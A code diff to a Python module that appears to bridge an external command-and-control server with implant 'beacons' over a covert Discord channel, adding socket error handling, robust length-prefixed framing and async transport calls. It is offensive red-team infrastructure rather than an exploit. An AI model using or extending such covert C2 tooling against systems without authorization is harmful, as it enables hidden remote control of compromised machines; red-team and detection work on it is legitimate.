@@ -17,35 +17,63 @@ def importModule(modName, modType):
 
 def createSocket():
     try:
-        # Borrowed from https://github.com/outflanknl/external_c2/blob/master/python_c2ex.py
-        d = {}
-        d['sock'] = socket.create_connection((config.EXTERNAL_C2_ADDR, int(config.EXTERNAL_C2_PORT)))
-        d['state'] = 1
-        return (d['sock'])
+        sock = socket.create_connection((config.EXTERNAL_C2_ADDR, int(config.EXTERNAL_C2_PORT)), timeout=10)
+        print("Socket successfully created")  # Debug: Ensure socket creation succeeded
+        return sock
     except Exception as e:
-        print(e)
+        print(f"Error creating socket: {e}")
         return None
 
 
 def sendFrameToC2(sock, chunk):
-    if isinstance(chunk, str):
-        chunk = chunk.encode('utf-8')  # Convert string to bytes using UTF-8
-    slen = struct.pack('<I', len(chunk))
-    sock.sendall(slen + chunk)
+    if isinstance(sock, socket.socket):  # Ensure we are working with a valid socket object
+        if isinstance(chunk, str):
+            chunk = chunk.encode('utf-8')  # Convert string to bytes using UTF-8
+        slen = struct.pack('<I', len(chunk))
+        sock.sendall(slen + chunk)
+    else:
+        print("Invalid socket provided to sendFrameToC2")
+
 
 
 def recvFrameFromC2(sock):
+    if not isinstance(sock, socket.socket):  # Check if sock is a valid socket
+        print(f"Error: Expected a socket, but got {type(sock)}")
+        return b""
+
     try:
+        # Receive the header (first 4 bytes) to get the length of the message
         chunk = sock.recv(4)
-    except:
-        return("")
-    if len(chunk) < 4:
-        return()
-    slen = struct.unpack('<I', chunk)[0]
-    chunk = sock.recv(slen)
-    while len(chunk) < slen:
-        chunk = chunk + sock.recv(slen - len(chunk))
-    return(chunk)
+        if len(chunk) == 0:  # Connection closed
+            print("Connection closed by the peer.")
+            return b""
+
+        if len(chunk) < 4:
+            print("Error: Incomplete header received.")
+            return b""
+
+        # Unpack the length of the incoming data
+        slen = struct.unpack('<I', chunk)[0]
+
+        # Initialize a buffer for the remaining data
+        data = bytearray()
+
+        while len(data) < slen:
+            # Receive the remaining data
+            chunk = sock.recv(slen - len(data))
+
+            if len(chunk) == 0:  # Connection closed
+                print("Connection closed by the peer while receiving data.")
+                return b""
+
+            data.extend(chunk)
+
+        return bytes(data)  # Convert bytearray back to bytes
+
+    except Exception as e:
+        print(f"Error receiving data: {e}")
+        return b""
+
 
 
 def killSocket(sock):
@@ -64,14 +92,14 @@ def decodeData(data):
     return rdyData
 
 
-def retrieveData(beaconId):
+async def retrieveData(beaconId):
     # This will retrieve data via the covert channel
     # Returns unencoded data
 
-    taskData = transport_discord.retrieveData(beaconId)
+    taskData = await transport_discord.retrieveData(beaconId)
 
     if config.debug:
-        print(color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (taskData)
+        print(color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s" % (taskData))
 
     # Prepare the received data by running it through the decoder
     for i in range(len(taskData)):
@@ -80,17 +108,16 @@ def retrieveData(beaconId):
     return taskData
 
 
-def sendData(data, beaconId):
+async def sendData(data, beaconId):
     # This will upload the data via the covert channel
     # returns a confirmation that the data has been sent
 
     if config.debug:
-        print(color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s") % (data)
+        print(color("RAW DATA TO BE SENT: ", status=False, yellow=True) + "%s" % data)
 
     # Prepares the data to be sent via the covert channel
-    preped_data = prepData(data)
 
-    transport_discord.sendData(preped_data, beaconId)
+    await transport_discord.sendData(data, beaconId)
 
 
 def color(string, status=True, warning=False, bold=True, yellow=False):
